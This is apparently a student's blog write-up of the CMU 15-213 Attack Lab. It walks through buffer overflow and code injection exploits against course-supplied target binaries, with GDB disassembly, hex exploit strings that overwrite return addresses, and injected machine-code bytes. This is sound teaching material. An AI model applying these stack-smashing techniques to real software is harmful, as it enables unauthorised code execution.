---
title: Attack Lab
author: Arjun
date: 2024-08-01
tags: assembly, low-level
---

## Overview
A lab assignment from CMU's [15-213 course](https://www.cs.cmu.edu/afs/cs/academic/class/15213-f22/www/schedule.html).

You can find the assignment [here](https://csapp.cs.cmu.edu/3e/labs.html)
Refer to [writeup](https://csapp.cs.cmu.edu/3e/attacklab.pdf)

Note: This is the 64-bit successor to the 32-bit Buffer Lab. Students are given a pair of unique custom-generated x86-64 binary executables, called targets, that have buffer overflow bugs. One target is vulnerable to code injection attacks. The other is vulnerable to return-oriented programming attacks. Students are asked to modify the behavior of the targets by developing exploits based on either code injection or return-oriented programming. This lab teaches the students about the stack discipline and teaches them about the danger of writing code that is vulnerable to buffer overflow attacks.

### Phase 1
Running `disas getbuf` inside GDB outputs the following
```c
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq
```
We can see that `0x28` (40) bytes has been allocated for `getbuf`.  
(struggled here because I assumed 0x28 was 28 bytes.)
We have to pad 40 bytes followed by the return address
`disas touch1`
```c
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
```

The return address should be `0x00000000004017c0`.
We add the following to `input.txt`

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

Then we run `./hex2raw < input.txt > output.txt`
Followed by, `./ctarget -q < output.txt`

```
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
```
### Phase 2
Writeup mentions that an argument (`%rdi`) is passed to `touch2`.  
We have to pass cookie as an argument to `touch2` i.e., store value in `cookie.txt` in `%rdi`

So what we are planning to do here is to 
1. obviously overflow the buffer
2. store our cookie in `%rdi`
3. call `touch2`
step 1 is straightforward, so is 3 (we can just overwrite the return address). but what about step 2?

**How do we execute this code?**
1. Basically we have to put our exploit code in the buffer (will explain this)
2. Pad the rest 
3. Overwrite the return address to the start of the buffer (this way our exploit code gets executed)

![buffer-overflow-code-injection](attack-lab-buffer-overflow.JPG)

sample input.txt
```
exploit code // stored cookie in %rdi
padding
address to start of buffer (%rsp) // exploit code gets executed
address to touch 2 // executes touch2 with cookie as argument
```

**generating exploit code**
Write the following into `p2.s`
```c
mov $0x59b997fa, %rdi //value of cookie read from cookie.txt is stored in rdi
retq
```

execute the following
```
gcc -c p2.s
objdump -d p2.o > p2.d
```

We get the following disassemble code
```c
0000000000000000 <.text>:
   0: 48 c7 c7 fa 97 b9 59      mov    $0x59b997fa,%rdi
   7: c3                        retq
```
We now have the byte representation of our exploit code. `48 c7 c7 fa 97 b9 59 c3`
Make sur `c3` is included. I thought the byte representation had to be in little-endian but that's not necessary. Pad the remaining 32 bytes with 0s.

To get address of start of buffer, run the program in gdb. get the address of `%rsp` before it exits `getbuf`. Add the address to `input.txt` in little-endian.
To get address of touch2, run `disas touch2` in gdb, the address of the first instruction is what we want. Add the address to `input.txt` in little-endian.

```
 48 c7 c7 fa 97 b9 59 c3
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 78 dc 61 55 00 00 00 00
 ec 17 40 00 00 00 00 00
```
### Phase 3

```c
int hexmatch(unsigned val, char *sval)
{
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}
```
`unsigned val` is `unsigned int` parameter
`s` is set to point at a random position within the first 100 bytes of `cbuf`.
`sprintf` writes the hex representation of `val` at position pointed by `s`
`strncmp` compares 9 bytes of `sval` and `val`. Returns 0 if strings are equal. `hexmatch` returns 1 if strings are equal.

```c
void touch3(char *sval) {
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	} else {
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```
We have to pass `cookie` in `%rdi` by writing it into the exploit string. Write only the eight hex digits. No `0x`. Terminate with `00`.

```
cookie + 00
exploit code // mov (%rsp), %rdi ; %rdi = cookie
padding
addr to exploit code // %rsp + 8
addr to touch 3
```


### Things to Remember
- stack structure
	- arguments are pushed to caller's stack frame in reverse order
	- return address is pushed to stack, also executes `call` instruction
	- `ebp` of P is pushed to stack by Q
	- `esp` is stored in `ebp`. current stack pointer is set as Q's base pointer.
	- `ebp` of callee is used as reference point to access arguments
	- `esp` is decremented to allocated space
- exploits
	- consider buffer of size N is allocated.
	- put exploit code in buffer. (assume exploit code fits in buffer)
	- pad remaining with garbage
	- overflow buffer by overwriting `return address` with start of exploit code.
- misc
	- `ret` pops return address from stack and jumps to address
	- `mov esp, ebp` > `pop ebp` > `ret`
		
